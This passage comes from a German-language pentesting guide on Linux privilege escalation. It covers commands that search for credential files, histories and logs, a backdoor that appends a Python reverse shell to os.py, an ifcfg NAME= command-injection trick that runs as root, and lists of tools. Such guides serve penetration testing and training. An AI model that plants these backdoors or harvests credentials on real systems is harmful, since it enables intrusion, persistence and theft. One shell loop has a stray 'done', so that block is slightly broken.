Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du den letzten nicht lesen können, aber versuche es).
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dateien an ungewöhnlichen Speicherorten/im Besitz
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### In den letzten Minuten geänderte Dateien
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite-DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). Das Tool sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist [**LaZagne**](https://github.com/AlessandroZ/LaZagne). Dabei handelt es sich um eine Open-Source-Anwendung, die dazu dient, viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux und Mac abzurufen.

### Logs

Wenn du Logs lesen kannst, findest du möglicherweise **interessante/vertrauliche Informationen in ihnen**. Je ungewöhnlicher der Log ist, desto interessanter ist er wahrscheinlich.\
Außerdem können einige „**schlecht**“ konfigurierte (mit einer Backdoor versehene?) **Audit-Logs** es ermöglichen, **Passwörter in Audit-Logs aufzuzeichnen**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen, ist die Gruppe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) wirklich hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Suche nach generischen Zugangsdaten/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" in ihrem **Namen** oder innerhalb des **Inhalts** enthalten, und in Logs nach IPs und E-Mail-Adressen sowie nach Hashes per Regex suchen.\
Ich werde hier nicht aufführen, wie man all dies erledigt. Wenn du interessiert bist, kannst du die letzten Prüfungen ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Beschreibbare Dateien

### Python library hijacking

Wenn du weißt, **von wo** aus ein Python-Skript ausgeführt wird und du **in diesen Ordner schreiben** oder **Python libraries modifizieren** kannst, kannst du die OS library modifizieren und mit einer Hintertür versehen (wenn du in den Ordner schreiben kannst, in dem das Python-Skript ausgeführt wird, kopiere die os.py library und füge sie dort ein).

Um die **library mit einer Hintertür zu versehen**, füge einfach am Ende der os.py library die folgende Zeile hinzu (IP und PORT ändern):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-Exploitation

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **Schreibrechten** auf eine Logdatei oder deren übergeordneten Verzeichnissen, möglicherweise höhere Privilegien zu erlangen. Der Grund dafür ist, dass `logrotate`, das häufig als **root** ausgeführt wird, manipuliert werden kann, um beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_, sondern auch in jedem Verzeichnis zu überprüfen, auf das die Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` in Version `3.18.0` und älter.

Weitere Informationen zu dieser Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** sehr ähnlich. Wenn Sie also feststellen, dass Sie Logs verändern können, überprüfen Sie, wer diese Logs verwaltet, und ob Sie Privilegien eskalieren können, indem Sie die Logs durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus irgendeinem Grund in der Lage ist, ein `ifcf-<whatever>`-Skript in _/etc/sysconfig/network-scripts_ zu **schreiben** oder ein bestehendes Skript **anzupassen**, ist Ihr **system is pwned**.

Network scripts, beispielsweise _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen exakt wie .INI-Dateien aus. Sie werden jedoch unter Linux von Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das Attribut `NAME=` in diesen Network scripts nicht korrekt verarbeitet. Wenn der Name **white/blank space** enthält, versucht das System, den Teil nach dem **white/blank space** auszuführen. Das bedeutet, dass **alles nach dem ersten blank space als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Beachte das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es umfasst Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt oder über symbolische Links in `/etc/rc?.d/` ausgeführt werden. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Andererseits steht `/etc/init` im Zusammenhang mit **Upstart**, einem neueren **Service-Management-System**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Management-Aufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte aufgrund einer Kompatibilitätsschicht in Upstart weiterhin zusammen mit Upstart-Konfigurationen verwendet.

**systemd** ist ein moderner Initialisierungs- und Service-Manager mit erweiterten Funktionen wie dem Starten von Daemons bei Bedarf, der Verwaltung von Automounts und Snapshots des Systemstatus. Es organisiert Dateien in `/usr/lib/systemd/` für Distributionspakete und in `/etc/systemd/system/` für Änderungen durch Administratoren und vereinfacht dadurch die Systemadministration.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Aus eingeschränkten Shells ausbrechen


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen Syscall, um privilegierte Kernel-Funktionen für einen Userspace-Manager verfügbar zu machen. Eine schwache Manager-Authentifizierung (z. B. Signaturprüfungen auf Grundlage der FD-Reihenfolge oder schwache Passwortverfahren) kann es einer lokalen App ermöglichen, den Manager zu imitieren und auf bereits gerooteten Geräten zu root zu eskalieren. Weitere Informationen und Exploit-Details findest du hier:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Die regex-basierte Service-Erkennung in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Kommandozeilen extrahieren und ihn mit -v in einem privilegierten Kontext ausführen. Freizügige Patterns (z. B. unter Verwendung von \S) können von Angreifern bereitgestellte Listener in beschreibbaren Verzeichnissen (z. B. /tmp/httpd) matchen, was zur Ausführung als root führen kann (CWE-426 Untrusted Search Path).

Weitere Informationen und ein verallgemeinertes Pattern, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, findest du hier:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Statische impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool zur Suche nach lokalen Linux-Privilege-Escalation-Vektoren:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Kernel-Vulns in Linux und MAC enumerieren [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physischer Zugriff):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zusammenstellung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
